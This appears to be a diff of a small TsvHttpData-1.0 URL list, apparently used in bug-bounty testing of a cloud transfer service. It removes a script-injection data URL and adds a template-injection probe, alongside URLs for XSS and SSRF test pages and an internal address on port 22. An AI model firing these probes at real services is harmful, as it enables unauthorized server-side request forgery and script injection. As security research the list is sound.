@@ -1,5 +1,5 @@
 TsvHttpData-1.0
-data:text/html,<script>alert(location);</script>
+https://{7*7}{{7*7}}[7*7][[7*7]]:80/csti
 https://bughunt1307.herokuapp.com/xss.html
 https://bughunt1307.herokuapp.com/ssrf1.php
 http://0.0.0.0:22/buckets/xss.html
